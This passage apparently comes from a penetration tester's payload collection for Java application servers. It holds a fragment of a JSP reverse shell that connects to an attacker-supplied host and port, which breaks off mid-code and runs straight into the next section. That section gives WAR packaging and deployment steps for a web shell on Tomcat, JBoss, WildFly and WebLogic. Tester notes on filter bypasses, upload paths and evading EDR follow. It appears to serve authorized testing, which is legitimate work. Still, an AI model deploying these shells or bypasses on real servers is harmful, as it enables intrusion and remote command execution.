filename: rev.jsp
---BEGIN---

<%
  String host = request.getParameter("h");
  String port = request.getParameter("p");

    Socket s = new Socket(host, Integer.parseInt(port));

    new Thread(() -> {
      try {

        OutputStream outS = s.getOutputStream();

# 13. WAR / EAR / JAR deployment payloads
#    (for Tomcat manager, JBoss, WildFly, WebLogic)
# ------------------------------------------------------------
[war_deploy_note]
filename: README-war.txt
---BEGIN---
A .war file is a ZIP archive with the following layout:

  shell.war
  ├── WEB-INF/
  │   ├── web.xml
  │   └── classes/
  └── shell.jsp

web.xml contents:

  <?xml version="1.0" encoding="UTF-8"?>
  <web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
    <servlet>
      <servlet-name>shell</servlet-name>
      <jsp-file>/shell.jsp</jsp-file>
    </servlet>
    <servlet-mapping>
      <servlet-name>shell</servlet-name>
      <url-pattern>/shell</url-pattern>
    </servlet-mapping>
  </web-app>

Deploy via:
  - Tomcat Manager  : PUT /manager/deploy?path=/shell
  - JBoss/WildFly   : admin console or CLI
  - WebLogic        : admin console
Once deployed, access at: /shell/shell.jsp?c=id
---END---
[/war_deploy_note]


# ============================================================
# Notes for testers
# ============================================================
# 1. Confirm execution BEFORE uploading a real shell.
#    Upload proof.jsp, request it, and look for the literal
#    string "BLACKHUNTER_UPLOAD_OK". If you don't see it, the
#    file was uploaded but not executed — move on to bypass
#    techniques (extensions.txt, mime_types.txt, JSPX/JSPF).
#
# 2. Compilation is lazy. Tomcat compiles JSPs on first request.
#    If a JSP contains a syntax error, you'll get a 500 with
#    the compiler message — useful for confirming execution
#    even when the payload is broken.
#
# 3. Common upload paths on Java stacks:
#    - Tomcat  : /manager/html  (deploy WAR), /examples/
#    - JBoss   : /jmx-console/, /web-console/
#    - WildFly : /management/
#    - WebLogic: /console/
#    Upload a .war rather than a .jsp when the manager is
#    reachable — it's more reliable than path-based uploads.
#
# 4. JSPX (XML syntax) and JSPF (fragment) are often missed by
#    filters that only block ".jsp". Try them after .jsp fails.
#
# 5. Expression Language (EL) injection works on older
#    containers and is a good WAF bypass when scriptlets are
#    blocked.
#
# 6. Nashorn (js engine) was removed in JDK 15. Test for it,
#    but don't rely on it on modern targets.
#
# 7. Do NOT leave a shell behind. Delete it before the
#    engagement ends, and document the exact path + hash in
#    the report as evidence of the finding.
#
# 8. Reverse shells from a Java process can be detected by EDR
#    faster than HTTP-based webshells. Prefer the HTTP shell
#    unless the RoE allows interactive access.
# ============================================================
